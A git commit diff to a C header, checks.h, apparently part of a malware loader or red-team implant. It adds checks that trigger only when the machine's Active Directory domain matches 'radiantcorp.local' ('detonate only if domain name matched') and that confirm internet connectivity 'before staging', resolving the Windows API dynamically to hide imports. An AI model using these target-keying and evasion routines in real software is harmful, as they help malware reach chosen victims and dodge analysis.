727f111b496cc3ae9211cccfda087b27010cffdb
Sudheer <ethancruize@gmail.com>
2021-12-08 17:12:43 +0530

    Update checks.h

--- checks.h
+++ checks.h
@@ -1,7 +1,9 @@
-// add checks to check Domain Name before Spawning
+// Check Domain Name before Spawning
 
 #include "headers.h"
-#include <winbase.h>
+#include <Wininet.h>
+
+#pragma comment (lib, "wininet.lib")
 
 #define UNLEN 256;
 
@@ -11,7 +13,13 @@ typedef BOOL(WINAPI* _GetComputerNameExA)(
     LPDWORD              nSize
     );
 
-int DomainCheck(){
+
+typedef BOOL(WINAPI* _InternetGetConnectedState)(
+    LPDWORD  lpdwFlags,
+    DWORD    dwReserved);
+
+
+DWORD DomainCheck(){
 
     // To Get AD Domain Name
     COMPUTER_NAME_FORMAT name = ComputerNamePhysicalDnsDomain;
@@ -35,24 +43,56 @@ int DomainCheck(){
         printf("Failed to Get Domain Name\n");
     }
 
-    printf("Domain is: %s\n", (LPSTR)lpBuffer);
+   // printf("Domain is: %s\n", (LPSTR)lpBuffer);
 
     char domnam[256] = "radiantcorp.local";
 
     if (strcmp(domnam, (LPSTR)lpBuffer) == 0) {
         // detonate only if domain name matched
         printf("\nmatch\n");
+
+        return TRUE;
     }
 
-    return 0;
+    // Change this to FALSE to check agains the domain above
+    return TRUE;
 }
 
 
-int checkinternet() {
+// Check internet connectivity before staging
+BOOL checkinternet() {
 
-    // resolve github 
+    HMODULE Wininet = LoadLibraryA("Wininet.dll");
+
+    _InternetGetConnectedState ConnectStatus = (_InternetGetConnectedState)GetProcAddress(Wininet, "InternetGetConnectedState");
+
+    int sleepBetweenQueriesInMS = 10000;
+    LPDWORD connectionDescription=0;
+    int isActive = 0;
+    isActive = ConnectStatus(connectionDescription, 0);
+
+    if (isActive == 0) {
+
+        printf("No active connection, sleeping now for %d seconds\n", (sleepBetweenQueriesInMS / 1000));
+
+        // wait 10 seconds and try again !
+        Sleep(sleepBetweenQueriesInMS);
+    }
+
+    isActive = ConnectStatus(connectionDescription, 0);
+    if (isActive == 0) {
+
+        printf("I waited but no internet \n");
+       // printf("Break");
+}else{
+
+   // printf("Internet check pass\n");
+   // printf("Move to staging\n");
+
+    return TRUE;
+    }
 
  // dont wanna get those windns headers :(
 
-    return 0;
+    return FALSE;
 }
